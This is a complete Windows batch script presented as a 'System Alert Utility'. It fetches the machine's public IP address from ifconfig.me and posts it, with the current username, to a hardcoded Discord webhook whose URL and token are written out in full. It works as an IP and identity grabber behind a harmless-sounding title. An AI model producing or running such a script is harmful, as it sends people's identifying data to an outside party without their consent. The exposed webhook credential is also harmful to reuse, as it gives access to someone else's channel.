@echo off
cls
color 0B
echo ===================================================
echo             SYSTEM ALERT UTILITY
echo ===================================================
echo.

:: 1. SET THE WEBHOOK (Quotes placed before the variable name to protect the URL)
set "webhook=https://discord.com/api/webhooks/1566129889428381696/tkCgE5JZlCcblX7aIrcFz1Kh7mg2I-4zQKDUOokZhYghy660UgpCrqtyrm0iC3-nAHDy"

:: 2. FETCH NETWORK METADATA
echo [1/2] Checking local network variables...
set "myip=Unknown_IP"
for /f "delims=" %%a in ('curl -s --max-time 5 ifconfig.me') do set "myip=%%a"

echo User: %username%
echo IP:   %myip%
echo.

:: 3. TRANSMIT PAYLOAD
echo [2/2] Transmitting payload to API...
echo.

:: Using clean JSON quotes to pass variables directly to curl
curl -i -H "Content-Type: application/json" -X POST -d "{\"content\": \"**Admin Notice**\n**User:** %username%\n**IP Address:** %myip%\"}" "%webhook%"

echo.
echo ===================================================
echo Execution finished. Check the server response above.
echo ===================================================
pause
